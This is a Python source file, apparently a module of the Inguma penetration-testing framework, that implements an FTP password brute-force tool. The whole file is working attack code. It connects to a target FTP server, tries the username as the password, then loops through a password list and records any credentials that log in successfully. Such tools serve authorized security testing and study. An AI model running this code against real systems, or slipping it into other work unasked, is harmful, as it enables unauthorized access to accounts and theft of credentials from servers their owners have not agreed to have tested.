##      CFtpBrute.py
#
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import os
import time
import ftplib
from lib.module import CIngumaBruteModule

name = "bruteftp"
brief_description = "A simple FTP brute force tool"
type = "brute"

class CFtpBrute(CIngumaBruteModule):

	exploitType = 3
	results = {}

	def __init__(self):
		self.ftp = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		self.gom.echo("target = <target host or network>")
		self.gom.echo("port = <target port>")
		self.gom.echo("user = <username>")

	def add_data_to_kb(self, element, value):
		""" It's used to add data to the knowledge base to be used, i.e., by other modules """
		if value == None:
			return

		if self.dict is not None:
			if self.dict.has_key(element):

				for x in self.dict[element]:
					if x == value:
						return

				self.dict[element] += [value]
			else:
				self.dict[element] = [value]

	def brute_force(self):
		userList = [self.user, ]
		if self.port == 0:
			self.port = 21

		self.open(self.target, self.port)

		try:
			#sys.stdout.write("Trying " + self.user + "/" + self.user)
			self.gom.echo("Trying " + self.user + "/" + self.user)
			self.login(self.user, self.user)
			self.add_data_to_kb(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			pass

		for user in userList:
			for passwd in self.get_password_list(self.dict['base_path']):
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					self.gom.echo("Trying " + user + "/" + passwd + "...")
					self.login(user, passwd)
					self.add_data_to_kb(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo("Aborted.")
					return False
				except:
					pass

		return False

	def run(self):
		if self.target == "":
			self.gom.echo("No target specified")
			return False

		if self.user == "":
			self.gom.echo("No user specified")
			return False

		self.brute_force()
		return True

	def print_summary(self):
		self.gom.echo("")
		for x in self.results:
			self.gom.echo(x + "/" + self.results[x] + "\n")

	def open(self,host,port):
		self.ftp = ftplib.FTP()
		self.ftp.connect(host, port)

	def login(self,username, password):
		if not self.ftp:
			self.gom.echo("Open a connection first.")

		self.ftp.login(username, password)

	def login_hash(self,username, lmhash, nthash):
		self.gom.echo("Not yet applicable")

	def logoff(self):
		if not self.ftp:
			self.gom.echo("Open a connection first.")

		self.ftp.close()
		self.ftp = None

	def close(self):
		if not self.ftp:
			self.gom.echo("Open a connection first.")

		self.ftp.close();
